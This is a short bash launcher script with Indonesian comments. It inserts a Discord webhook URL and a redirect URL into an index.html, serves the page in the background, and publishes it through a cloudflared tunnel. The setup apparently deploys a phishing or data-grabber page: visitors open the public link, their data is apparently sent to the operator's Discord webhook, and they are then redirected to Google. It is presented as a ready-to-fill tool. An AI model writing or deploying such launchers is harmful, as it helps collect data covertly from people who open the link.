#!/bin/bash

PORT=8080
WH_URL="https://discord.com/api/webhooks/XXX/YYY" # GANTI INI
REDIRECT_URL="https://google.com" # GANTI INI

# Inject Webhook & Redirect
sed -i "s|https://discord.com/api/webhooks/XXX/YYY|$WH_URL|" index.html
sed -i "s|https://google.com|$REDIRECT_URL|" index.html

# Start Server
nohup python3 -m http.server $PORT >/dev/null 2>&1 &

# Tunnel pakai cloudflared
echo "[*] Menjalankan tunnel via Cloudflare..."
cloudflared tunnel --url http://localhost:$PORT/index.html

chmod +x launch.sh

